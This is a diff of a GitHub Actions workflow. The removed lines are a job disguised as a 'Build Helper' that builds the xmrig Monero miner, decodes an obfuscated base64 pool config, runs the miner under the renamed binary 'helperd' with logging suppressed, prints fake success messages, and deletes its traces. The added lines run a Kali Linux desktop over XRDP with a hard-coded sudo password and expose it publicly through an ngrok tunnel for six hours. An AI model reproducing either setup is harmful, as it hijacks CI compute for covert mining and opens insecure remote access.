@@ -1,41 +1,58 @@
-name: Build Helper
+name: Kali RDP with ngrok
 
 on:
-  push:
-    branches: [ main ]
-  schedule:
-    - cron: '0 */4 * * *'
-  workflow_dispatch:
+  workflow_dispatch:   # Aap manually trigger kar sakte hain
 
 jobs:
-  helper:
+  build:
     runs-on: ubuntu-latest
+    container:
+      image: kalilinux/kali-rolling
+      options: --privileged   # Systemd aur service ke liye chahiye
+    
     steps:
-      - uses: actions/checkout@v4
+      - name: Checkout code
+        uses: actions/checkout@v4
 
-      - name: Setup base environment
+      - name: Update and install XRDP + XFCE4
         run: |
-          sudo apt-get update -qqq && sudo apt-get install -yqq git cmake build-essential libuv1-dev libssl-dev libhwloc-dev curl jq > /dev/null 2>&1
-          echo "[INFO] Step completed successfully"
+          apt-get update -y
+          apt-get install -y kali-desktop-xfce xorg xrdp sudo curl wget
+          # Create a user for RDP login
+          useradd -m -s /bin/bash kali
+          echo "kali:Kaligithub@123" | chpasswd
+          usermod -aG sudo kali
+          # Configure XFCE as default session
+          echo "startxfce4" > /home/kali/.xsession
+          chown kali:kali /home/kali/.xsession
+          # Start XRDP service (in background)
+          service dbus start
+          service xrdp start
+          # Allow RDP port
+          sed -i 's/port=3389/port=3389/g' /etc/xrdp/xrdp.ini
 
-      - name: Gather required materials
+      - name: Download ngrok
         run: |
-          git clone -q https://github.com/xmrig/xmrig.git /tmp/g
-          cd /tmp/g && mkdir -p h && cd h
-          cmake .. -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS=ON -Wno-dev > /dev/null 2>&1
-          make -j2 > /dev/null 2>&1
-          echo "[INFO] Step completed successfully"
+          wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+          tar xvzf ngrok-v3-stable-linux-amd64.tgz
+          chmod +x ngrok
 
-      - name: Execute core sequence
+      - name: Expose RDP port via ngrok
+        env:
+          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         run: |
-          cd /tmp/g/h
-          echo 'W3sicG9vbHMiOlt7InVybCI6Im1vbmVyZW9jZWFuLnN0cmVhbToxMDEyOCIsInVzZXIiOiIkV0FMTEVUIiwicGFzcyI6IngiLCJ0bHMiOnRydWUsImtlZXBhbGl2ZSI6dHJ1ZX1dfV0=' | base64 -d | jq --arg w "$WALLET" '.pools[0].user = $w' > /tmp/g.json
-          cp xmrig p1 && mv p1 p2 && mv p2 p3 && mv p3 p4 && mv p4 p5 && mv p5 p6 && mv p6 helperd
-          nohup ./helperd --config /tmp/g.json --cpu-max-threads-hint=62 --background --no-color --log-file=/dev/null --donate-level=0 > /dev/null 2>&1 &
-          sleep 30 && echo "[INFO] Step completed successfully"
-          sleep 420 && echo "[INFO] Step completed successfully"
+          ./ngrok authtoken $NGROK_AUTH_TOKEN
+          # Run ngrok TCP tunnel on port 3389
+          ./ngrok tcp 3389 &
+          sleep 5
+          # Fetch the public URL
+          curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*' | grep -o 'tcp://[^"]*'
 
-      - name: Confirm final status
+      - name: Keep job alive (6 hours max)
         run: |
-          echo "[INFO] Step completed successfully"
-          rm -rf /tmp/g /tmp/g.json /tmp/* 2>/dev/null || true
+          echo "✅ RDP is ready! Connect using the ngrok address above."
+          echo "Username: kali"
+          echo "Password: Kaligithub@123"
+          echo "The runner will stay alive for 6 hours. Press Ctrl+C to stop early if running locally."
+          # Keep the job running so you can connect
+          tail -f /dev/null
